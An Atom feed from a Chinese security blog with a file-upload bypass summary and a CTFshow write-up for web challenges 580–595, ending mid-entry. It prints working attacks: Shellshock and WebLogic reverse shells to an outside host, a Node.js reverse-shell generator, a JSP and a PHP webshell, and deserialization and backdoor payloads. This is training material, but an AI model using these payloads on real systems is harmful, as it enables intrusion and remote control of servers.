<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lewiserii&#39;s blog</title>
  
  
  <link href="https://lewiserii.github.io/atom.xml" rel="self"/>
  
  <link href="https://lewiserii.github.io/"/>
  <updated>2021-06-16T08:29:14.537Z</updated>
  <id>https://lewiserii.github.io/</id>
  
  <author>
    <name>lewiserii</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件上传总结</title>
    <link href="https://lewiserii.github.io/2021/06/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"/>
    <id>https://lewiserii.github.io/2021/06/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</id>
    <published>2021-06-20T04:00:00.000Z</published>
    <updated>2021-06-16T08:29:14.537Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#%E4%B8%BB%E8%A6%81%E7%9A%84%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95">主要的验证方法</a><ul><li><a href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E9%AA%8C%E8%AF%81">文件头验证</a></li><li><a href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81">前端验证</a></li><li><a href="#content-type%E9%AA%8C%E8%AF%81">Content-Type验证</a></li><li><a href="#content-length%E9%AA%8C%E8%AF%81">CONTENT-LENGTH验证</a></li></ul></li><li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">绕过方法</a><ul><li><a href="#%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80">双写后缀</a></li><li><a href="#iis-%E5%88%86%E5%8F%B7%E6%BC%8F%E6%B4%9E">iis 分号漏洞</a></li><li><a href="#iis-asp%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">iis asp目录解析漏洞</a></li><li><a href="#gif89a%E5%9B%BE%E7%89%87%E5%A4%B4%E6%AC%BA%E9%AA%97">GIF89a图片头欺骗</a></li><li><a href="#apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">apache解析漏洞</a></li><li><a href="#00%E6%88%AA%E6%96%AD">00截断</a></li><li><a href="#htaccess">.htaccess</a></li><li><a href="#userini">.user.ini</a></li></ul></li></ul><!-- tocstop --><hr><h1><span id="主要的验证方法">主要的验证方法</span></h1><h3><span id="文件头验证">文件头验证</span></h3><blockquote><p>PNG 的文件头为<br>89 50 4e 47 0d 0a 1a 0a</p></blockquote><blockquote><p>GIF(相当于文本的GIF89a)：<br>47 49 46 38</p></blockquote><blockquote><p>JPG 为<br>ff d8 ff</p></blockquote><h3><span id="前端验证">前端验证</span></h3><p>在前端进行后缀的校验<br>绕过方法：访问chrome://settings/content/javascript?search=java  禁用js或抓包修改后缀<br><a href="https://imgtu.com/i/2OYMAU"><img src="https://z3.ax1x.com/2021/06/16/2OYMAU.png" alt="2OYMAU.png"></a></p><h3><span id="content-type验证">Content-Type验证</span></h3><p>上传 xx.php然后抓包修改content-type为 image/png<br><a href="https://imgtu.com/i/2OtDaT"><img src="https://z3.ax1x.com/2021/06/16/2OtDaT.png" alt="2OtDaT.png"></a><br>主要类型如下</p><blockquote><p>text/plain（纯文本）<br>text/html（HTML文档）<br>text/javascript（js代码）<br>application/xhtml+xml（XHTML文档）<br>image/gif（GIF图像）<br>image/jpeg（JPEG图像）<br>image/png（PNG图像）<br>video/mpeg（MPEG动画）<br>application/octet-stream（二进制数据）<br>application/pdf（PDF文档）<br>application/(编程语言) 该种语言的代码<br>application/msword（Microsoft Word文件）<br>message/rfc822（RFC 822形式）<br>multipart/alternative（HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示）<br>application/x-www-form-urlencoded（ POST方法提交的表单）<br>multipart/form-data（POST提交时伴随文件上传的表单）</p></blockquote><h3><span id="content-length验证">CONTENT-LENGTH验证</span></h3><p>长度验证</p><h1><span id="绕过方法">绕过方法</span></h1><h3><span id="双写后缀">双写后缀</span></h3><p>例如：1.phphpp<br>在过滤一次php后转为1.php</p><h3><span id="iis-分号漏洞">iis 分号漏洞</span></h3><p>只要一个文件有(.asp)后面再带上分号(;)后面再带上一个随意字符加上扩展名如(cao.asp;ca.jpg)这个文件Windows会当成jpg图像文件，但是这种文件在IIS中会被当成asp运行(cao.asp;ca.jpg)这个文件IIS会识别成(cao.asp)，分号以后的东西忽略了- -。所以说(cao.asp;.jpg)这样的文件名也行！</p><h3><span id="iis-asp目录解析漏洞">iis asp目录解析漏洞</span></h3><p>该解析漏洞形成原因是以*.asp命名的文件夹里面的文件都会被当作asp文件解析！</p><h3><span id="gif89a图片头欺骗">GIF89a图片头欺骗</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_GET[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3><span id="apache解析漏洞">apache解析漏洞</span></h3><p>shell.php.asd<br>asd无法解析，认为是.php</p><h3><span id="00截断">00截断</span></h3><p>0x00，%00，/00之类的截断，都是一样的，只是不同表示而已</p><p>?filename=test.php%00.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//url<br>shell.jpg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//上传的文件</p><p>php 00截断<br>php版本要小于5.3.4，5.3.4及以上已经修复该问题<br>magic_quotes_gpc需要为OFF状态</p><h3><span id="htaccess">.htaccess</span></h3><p>SetHandler application/x-httpd-php</p><h3><span id="userini">.user.ini</span></h3><p>如果采用exif_imagetype()验证文件后缀，可以尝试上传user.ini</p><p>auto_prepend_file = &lt; filename&gt; // 包含在文件头<br>auto_append_file = &lt; filename&gt; // 包含在文件尾（遇到exit语句失效）</p><p>注意：<br>1.这两个配置项相当于文件包含 require()<br>2.该目录下必须存在.php文件</p><p>未完待续。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%B8%BB%E8%A6%81%E7%9A%84%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95&quot;&gt;主要的验证方法&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%96%87%E4</summary>
      
    
    
    
    <category term="总结" scheme="https://lewiserii.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://lewiserii.github.io/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow-web入门-组件漏洞</title>
    <link href="https://lewiserii.github.io/2021/06/18/CTFshow-%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <id>https://lewiserii.github.io/2021/06/18/CTFshow-%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-06-18T08:36:00.000Z</published>
    <updated>2021-06-18T08:38:09.850Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#web580">WEB580</a></li><li><a href="#web581">WEB581</a></li><li><a href="#web582">WEB582</a></li><li><a href="#web583">WEB583</a></li><li><a href="#web584">WEB584</a></li><li><a href="#web585">WEB585</a></li><li><a href="#web586">WEB586</a></li><li><a href="#web587">WEB587</a></li><li><a href="#web588">WEB588</a></li><li><a href="#web589">WEB589</a></li><li><a href="#web590">WEB590</a></li><li><a href="#web591">WEB591</a></li><li><a href="#web592">WEB592</a></li><li><a href="#web593">WEB593</a></li><li><a href="#web594">WEB594</a></li><li><a href="#web595">WEB595</a></li><li><a href="#web596">WEB596</a></li><li><a href="#web597">WEB597</a></li><li><a href="#web598">WEB598</a></li><li><a href="#web599">WEB599</a></li></ul><!-- tocstop --><p>本篇文章会解释从WEB580–WEB599的做法<br><img src="https://z3.ax1x.com/2021/06/17/2jg9ED.md.png"></p><h1><span id="web580">WEB580</span></h1><p>根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）<br>这一题试了很多种payload，除了能看/etc/passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）<br>payload：<br><code>() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/37634 0&gt;&amp;1;</code><br>发送如下数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/index.cgi HTTP/1.1</span><br><span class="line">Host: 7f35523e-4939-43d8-8a05-f6348618a843.challenge.ctf.show:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">lewiserii: () &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/37634 0&gt;&amp;1;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://7f35523e-4939-43d8-8a05-f6348618a843.challenge.ctf.show:8080/cgi-bin/victim.cgi</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=179eb628608d03-066c8283766a21-f7f1939-1bcab9-179eb62860986d</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到shell<br><img src="https://z3.ax1x.com/2021/06/17/2jgSHO.md.png"></p><h1><span id="web581">WEB581</span></h1><p>具体可以参考<a href="https://paper.seebug.org/334/">CVE-2017-6920</a><br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=!php/object O:3:&quot;log&quot;:2:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;s:7:&quot;content&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>只要带上!php/object  后面就会进行反序列化<br>写入文件后访问<br><img src="https://z3.ax1x.com/2021/06/17/2jczDK.md.png"></p><h1><span id="web582">WEB582</span></h1><p>nodejsshell.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 3:</span><br><span class="line">    print &quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot; % (sys.argv[0])</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line">IP_ADDR = sys.argv[1]</span><br><span class="line">PORT = sys.argv[2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def charencode(string):</span><br><span class="line">    &quot;&quot;&quot;String.CharCode&quot;&quot;&quot;</span><br><span class="line">    encoded = &#x27;&#x27;</span><br><span class="line">    for char in string:</span><br><span class="line">        encoded = encoded + &quot;,&quot; + str(ord(char))</span><br><span class="line">    return encoded[1:]</span><br><span class="line"></span><br><span class="line">print &quot;[+] LHOST = %s&quot; % (IP_ADDR)</span><br><span class="line">print &quot;[+] LPORT = %s&quot; % (PORT)</span><br><span class="line">NODEJS_REV_SHELL = &#x27;&#x27;&#x27;</span><br><span class="line">var net = require(&#x27;net&#x27;);</span><br><span class="line">var spawn = require(&#x27;child_process&#x27;).spawn;</span><br><span class="line">HOST=&quot;%s&quot;;</span><br><span class="line">PORT=&quot;%s&quot;;</span><br><span class="line">TIMEOUT=&quot;5000&quot;;</span><br><span class="line">if (typeof String.prototype.contains === &#x27;undefined&#x27;) &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;</span><br><span class="line">function c(HOST,PORT) &#123;</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(PORT, HOST, function() &#123;</span><br><span class="line">        var sh = spawn(&#x27;/bin/sh&#x27;,[]);</span><br><span class="line">        client.write(&quot;Connected!\\n&quot;);</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">        sh.on(&#x27;exit&#x27;,function(code,signal)&#123;</span><br><span class="line">          client.end(&quot;Disconnected!\\n&quot;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    client.on(&#x27;error&#x27;, function(e) &#123;</span><br><span class="line">        setTimeout(c(HOST,PORT), TIMEOUT);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">c(HOST,PORT);</span><br><span class="line">&#x27;&#x27;&#x27; % (IP_ADDR, PORT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[+] Encoding&quot;</span><br><span class="line">PAYLOAD = charencode(NODEJS_REV_SHELL)</span><br><span class="line">print &quot;eval(String.fromCharCode(%s))&quot; % (PAYLOAD)</span><br></pre></td></tr></table></figure><p>通过nodejsshell.py生成payload<br><img src="https://z3.ax1x.com/2021/06/17/2j7xKg.png"><br>放入<code>&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function ()&#123;生成的payload&#125;()&quot;,&quot;password&quot;:123&#125;</code>,然后base64编码加url编码<br>bp抓包，构造一个user并传入payload<br><img src="https://z3.ax1x.com/2021/06/17/2jqIrF.png"><br>成功反弹shell<br><img src="https://z3.ax1x.com/2021/06/17/2jq5KU.png"></p><h1><span id="web583">WEB583</span></h1><p>CVE-2016-10033<br>在github上找到了<a href="https://github.com/opsxcq/exploit-CVE-2016-10033">exp</a><br>直接打就行了<br><img src="https://z3.ax1x.com/2021/06/17/2vpd8H.png"></p><p>但是这里有个地方要注意<br>现在（6.17）github上的exp是打不通的<br>我把这个和以前在github上下的版本用beyond比对了一下<br>！ 竟然不一样，如果你用官网的打不通可以试试我这个<a href="https://pan.baidu.com/s/1PHYAEyRyubLVZw8cc-iscg">版本</a>,提取码是f3rw<br><img src="https://z3.ax1x.com/2021/06/17/2vQT54.png"></p><h1><span id="web584">WEB584</span></h1><p>生成数字exp(将echo后的内容替换成你自己的反弹一句话)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9jbjEudXRvb2xzLmNsdWIvNDUyMTQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br><span class="line">bytecode = &#x27;,&#x27;.join(str(i) for i in list(payload))</span><br><span class="line">print(bytecode)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;生成的数字&#125;))/lastname&quot;, &quot;value&quot;: &quot;ctfshow&quot; &#125;]</span><br></pre></td></tr></table></figure><p>首先post /api/people新建一个用户,获取到id<br><img src="https://z3.ax1x.com/2021/06/17/2v1vND.png"></p><p>然后通过PATCH /api/people/1，可以rce反弹shell<br><strong>注意Content-Type的格式</strong></p><p><img src="https://z3.ax1x.com/2021/06/17/2v34qP.png"><br><img src="https://z3.ax1x.com/2021/06/17/2v3hrt.png"></p><h1><span id="web585">WEB585</span></h1><p>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）<br>直接抓包传即可，但是要注意tomcat对文件后缀有一定验证，（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用/）来绕过限制。<br><img src="https://z3.ax1x.com/2021/06/17/2vBIZ4.png"></p><p>拿到shell<br><img src="https://z3.ax1x.com/2021/06/17/2vB4LF.png"></p><p>jsp小马（pwd=023）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%!public static String excuteCmd(String c)</span><br><span class="line">&#123;</span><br><span class="line">    StringBuilder line = new StringBuilder();</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">    Process pro = Runtime.getRuntime().exec(c);</span><br><span class="line">    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));</span><br><span class="line">    String temp = null;</span><br><span class="line">    while ((temp = buf.readLine()) != null)</span><br><span class="line">    &#123;</span><br><span class="line">        line.append(temp+&quot;\\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    buf.close();</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">    line.append(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">return line.toString();</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))</span><br><span class="line">&#123;</span><br><span class="line">    out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    out.println(&quot;:-)&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h1><span id="web586">WEB586</span></h1><p>wordpress环境，首先尝试弱口令，进不去，只好创建一个用户进行测试<br>发现里面有一篇文章介绍了这个插件漏洞<br>使用百度，发现对于下面这个地址的id参数（post）存在sql注入，因为没有过滤直接带入了sql语句，所以造成了sql注入<br>IP/wp-admin/admin-ajax.php?action=populate_download_edit_form</p><p>我用sqlmap跑出来了，也可以手注（使用load_file读文件）<br><img src="https://z3.ax1x.com/2021/06/17/2vyt0S.png"><br><img src="https://z3.ax1x.com/2021/06/17/2v6PHS.png"></p><h1><span id="web587">WEB587</span></h1><p>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）<br>漏洞使用了XMLDecoder来解析用户传入的XML数据，但在在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：<br><img src="https://z3.ax1x.com/2021/06/17/2vgSw8.png"><br><img src="https://z3.ax1x.com/2021/06/17/2vczef.png"><br>POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=179eb628608d03-066c8283766a21-f7f1939-1bcab9-179eb62860986d</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 641</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/cn1.utools.club/45214 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><h1><span id="web588">WEB588</span></h1><p>吐槽一下：这一题的环境生成的好慢，我还以为环境坏了</p><p>Weblogic 任意文件上传漏洞（CVE-2018-2894）<br>利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p><p>访问IP/ws_utc/config.do，如果进入时不是设置页面而是登陆页面可以刷新一下多试几次</p><p>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p><p>然后点击安全 -&gt; 增加，然后上传webshell并找到这个文件的时间戳（可以抓包或F12查看）：<br><img src="https://z3.ax1x.com/2021/06/17/2vL8c6.png"></p><p>然后访问IP/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell(flag在环境变量里)：<br><img src="https://z3.ax1x.com/2021/06/17/2vOdqU.png"></p><h1><span id="web589">WEB589</span></h1><p>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</p><p>首先访问IP/admin/test/systemProperties.jsp，查看ActiveMQ的绝对路径(账号密码为admin弱口令)：<br><img src="https://z3.ax1x.com/2021/06/17/2vx061.png"></p><p>然后PUT方法上传webshell：<br>上传成功后可以访问看一下，发现代码直接显示了，那么就表示没有解析，需要换个目录<br><img src="https://z3.ax1x.com/2021/06/17/2xSxoT.png"></p><p>使用MOVE方法移动到web目录下的api文件夹（/opt/activemq/webapps/api/s.jsp）中：<br><img src="https://z3.ax1x.com/2021/06/17/2xpSFU.png"><br><img src="https://z3.ax1x.com/2021/06/17/2xSvwV.png"></p><h1><span id="web590">WEB590</span></h1><p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><p>使用<a href="https://github.com/vulhub/Apereo-CAS-Attack/releases">Apereo-CAS-Attack</a>来生成POC<br><img src="https://z3.ax1x.com/2021/06/17/2xPjc4.png"><br>然后我们登录CAS并抓包，将Body中的execution值替换成上面生成的Payload发送<br><img src="https://z3.ax1x.com/2021/06/17/2xPbNV.png"><br><img src="https://z3.ax1x.com/2021/06/17/2xPHA0.png"></p><h1><span id="web591">WEB591</span></h1><p>591后面都是福利题了，嘿嘿<br>Apache HTTPD 换行解析漏洞（CVE-2017-15715）<br>在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A）<br><img src="https://z3.ax1x.com/2021/06/17/2xmq4s.png"><br>访问刚才上传的/1.php%0a，发现能够成功解析<br><img src="https://z3.ax1x.com/2021/06/17/2xmbNj.png"></p><h1><span id="web592">WEB592</span></h1><p>Apache HTTPD 多后缀解析漏洞</p><p>上传的文件中只要包含.php都能被解析<br><img src="https://z3.ax1x.com/2021/06/17/2xQkdO.png"></p><p><img src="https://z3.ax1x.com/2021/06/17/2xQAoD.png"></p><h1><span id="web593">WEB593</span></h1><p>Apache SSI 远程命令执行漏洞<br>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p><p>上传一个shtml文件<br><img src="https://z3.ax1x.com/2021/06/17/2x1IRH.png" alt="2x1IRH.png"><br>访问生成的文件<br><img src="https://z3.ax1x.com/2021/06/17/2x15Je.png" alt="2x15Je.png"></p><h1><span id="web594">WEB594</span></h1><p>Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。<br><a href="https://github.com/SNCKER/CVE-2021-3129/blob/master/exploit.py">EXP</a><br>运行exp还需要php，python3，linux环境，下载<a href="https://github.com/ambionics/phpggc">phpggc</a>放在同一级目录下<br>使用时只需要修改exp中的URL和命令即可<br><img src="https://z3.ax1x.com/2021/06/17/2xGi5T.png"></p><h1><span id="web595">WEB595</span></h1><p>原型为PHP官方GIT服务器近日被植入的后门。<br>首先，后门程序会检测http头是否含有User-Agentt(不是User-Agent，多了一个t)。<br>如果存在，判断它的值是否含有zerodium字符串，作为触发后门的“口令”。<br>如果标示存在，从User-Agentt值的第8个字节起到结尾提取字符串作为代码（前8个字符为zerodium），进行编译执行，如同eval函数效果。<br>抓包改报文即可执行命令：<br>User-Agentt: zerodiumsystem(‘ls /‘);<br><img src="https://z3.ax1x.com/2021/06/17/2xJvBn.png"></p><h1><span id="web596">WEB596</span></h1><p>Python PIL 远程命令执行漏洞（GhostButt 